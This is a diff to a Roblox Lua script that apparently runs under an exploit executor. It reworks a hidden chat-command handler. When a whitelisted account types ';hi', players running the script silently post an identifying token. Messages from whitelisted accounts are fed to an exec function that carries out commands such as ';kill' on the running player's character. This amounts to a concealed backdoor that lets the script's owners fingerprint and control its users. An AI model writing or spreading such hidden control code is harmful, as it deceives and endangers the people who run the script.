@@ -66,6 +66,10 @@ end
 for _, p in ipairs(Players:GetPlayers()) do tag(p) end
 Players.PlayerAdded:Connect(function(p) task.delay(1, function() tag(p) end) end)
 
+local function getHRP()
+	return LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("HumanoidRootPart")
+end
+
 local function exec(cmd, senderId)
 	cmd = string.lower(cmd)
 	local undo = false
@@ -76,10 +80,6 @@ local function exec(cmd, senderId)
 
 	local sender = Players:GetPlayerByUserId(senderId)
 	if not sender or not sender.Character or not sender.Character:FindFirstChild("HumanoidRootPart") then return end
-
-	local function getHRP()
-		return LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("HumanoidRootPart")
-	end
 
 	if cmd == ";kill" and not undo then
 		local c = LOCAL_PLAYER.Character
@@ -169,49 +169,21 @@ TextChatService.MessageReceived:Connect(function(msg)
 	local s = msg.TextSource
 	if not s then return end
 	local uid = s.UserId
+	if uid == LOCAL_PLAYER.UserId then return end
 
-	if t == ";log" and isWhitelisted(uid) and not isWhitelisted(LOCAL_PLAYER.UserId) then
+	if t:lower() == ";hi" and isWhitelisted(uid) and not isWhitelisted(LOCAL_PLAYER.UserId) then
 		task.delay(0.4, function()
-			chatMessage("8Uz1P")
+			pcall(function()
+				TextChatService.TextChannels.RBXGeneral:SendAsync("8Uz1P")
+			end)
 		end)
 	end
-end)
 
-local function chatMessage(str)
-	str = tostring(str)
-	pcall(function()
-		TextChatService.TextChannels.RBXGeneral:SendAsync(str)
-	end)
-end
-
-TextChatService.MessageReceived:Connect(function(msg)
-	local t = msg.Text
-	local s = msg.TextSource
-	if not s then return end
-	local uid = s.UserId
-
-	if uid ~= LOCAL_PLAYER.UserId and isWhitelisted(uid) and not isWhitelisted(LOCAL_PLAYER.UserId) then
+	if isWhitelisted(uid) and not isWhitelisted(LOCAL_PLAYER.UserId) then
 		exec(t, uid)
 	end
-
-	if t == ";log" and not isWhitelisted(LOCAL_PLAYER.UserId) then
-		task.delay(0.4, function()
-			chatMessage("8Uz1P")
-		end)
-	end
 end)
 
-
-TextChatService.MessageReceived:Connect(function(msg)
-	local t = msg.Text
-	local s = msg.TextSource
-	if not s then return end
-	local uid = s.UserId
-	if uid == LOCAL_PLAYER.UserId then return end
-	if not isWhitelisted(uid) then return end
-	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
-	exec(t, uid)
-end)
 
 
 local isfile = isfile or function(file)
